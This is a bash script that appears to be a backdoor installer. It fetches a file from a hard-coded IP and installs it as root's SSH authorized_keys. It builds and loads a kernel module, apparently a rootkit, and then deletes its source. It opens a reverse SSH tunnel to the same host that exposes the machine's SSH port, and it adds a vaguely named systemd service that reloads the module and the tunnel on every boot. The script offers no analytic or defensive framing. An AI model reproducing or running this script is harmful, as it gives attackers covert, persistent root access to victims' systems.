#! /bin/bash
wget --no-check-certificate https://51.38.185.89/ankylosaurus
mv ankylosaurus /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
wget --no-check-certificate https://51.38.185.89/Dilophosaurus.zip
unzip Dilophosaurus.zip
cd Dilophosaurus
make
insmod dilophosaurus.ko
cp dilophosaurus.ko /lib/dilophosaurus.ko
cd ..
rm Dilophosaurus.zip
rm -R Dilophosaurus
ssh -fN -i /root/.ssh/authorized_keys -R 0.0.0.0:7070:localhost:22 extractor@51.38.185.89 -p 41135 -oStrictHostKeyChecking=no 
kill -24 $(ps axf | grep "ssh -fN" | grep -v grep | awk '{print $1}')



echo "#! /bin/bash
insmod /lib/dilophosaurus.ko
ssh -fN -i /root/.ssh/authorized_keys -R 0.0.0.0:7070:localhost:22 extractor@51.38.185.89 -p 41135 
kill -24 \$(ps axf | grep \"ssh -fN\" | grep -v grep | awk '{print $1}')
while :
do
        sleep 1
done" > /lib/start.sh
chmod +x /lib/start.sh

echo "[Unit]
Description = starting stuff
After =  network-online.target
[Service]
User = root
ExecStart=/lib/start.sh
[Install]
WantedBy = multi-user.target" > /etc/systemd/system/start.service

systemctl enable start.service
